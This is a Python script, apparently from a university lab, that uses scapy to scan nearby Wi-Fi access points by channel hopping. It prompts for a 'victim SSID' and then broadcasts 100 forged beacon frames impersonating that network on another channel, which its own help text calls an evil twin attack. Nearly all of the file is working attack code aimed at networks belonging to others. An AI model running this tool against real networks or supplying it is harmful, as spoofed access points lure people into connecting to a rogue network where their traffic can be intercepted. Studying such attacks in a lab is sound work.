#!/usr/bin/env python
# Source https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
# Authors : Axel Vallon and Robin Gaudin
# Date : 30.03.2022

from scapy.all import *
from threading import Thread
import pandas
import time
import os

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def PacketHandler(packet) :
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")

        networks.loc[bssid] = (ssid, dbm_signal, channel)
    
def print_all():
    while active_threads:
        os.system("clear")
        print("Wait 10 seconds before selecting the SSID\n")
        print(networks)
        time.sleep(0.5)

def change_channel():
    ch = 1
    while active_threads:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def send_beacon(ssid, mac, channel, iface):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/Dot11Beacon()/essid
    os.system(f"iwconfig {iface} channel {channel}")
    sendp(frame, inter=0.1, count=100, iface=iface, verbose=0)
    # we deceided to send 100 packet, as it is easier to see them with capture
    print("100 beacon packet to channel ", channel, " with SSID ", ssid, " has been sent")


if __name__ == '__main__':
    import argparse

    DEFAULT_WLAN = "wlan0"
    DEFAULT_GATEWAY = "aa:aa:aa:aa:aa:aa"
    parser = argparse.ArgumentParser(description="A python script to generate an evil tween attack")
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan'", default=DEFAULT_WLAN)
    parser.add_argument("--gateway", dest="gateway", help="Gateway MAC address we want user to connect to, defaults is 'aa:aa:aa:aa:aa:aa'", default=DEFAULT_GATEWAY)
    args = parser.parse_args()
    iface = args.iface
    gateway = args.gateway

    # we start 2 Threads, one for printing and one to change channel +=1 every 0.5 seconds, as we could see the maximum ssid
    active_threads = True
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing, it stops 10 seconds later
    sniff(prn=PacketHandler, iface=iface, timeout=10)

    # stop the threads, we finished the scan
    active_threads = False
    printer.join()
    channel_changer.join()

    # 3. get the ssid name
    input_ssid = input("Type the victim SSID")
    while input_ssid not in networks.values:
        print('Type the SSID to attack : ')
        input_ssid = input()
    
    # 4. we get the orinal channel, and we add 6 % 14 value to it, as we won't collide with the first one
    victim_network = networks.loc[networks['SSID'] == input_ssid].iloc[0]
    print ("You selected the following SSID")
    print(victim_network)
    victim_channel = (victim_network['Channel'] + 6) % 14

    # we send the unique beacon
    send_beacon(input_ssid, gateway, victim_channel, iface)
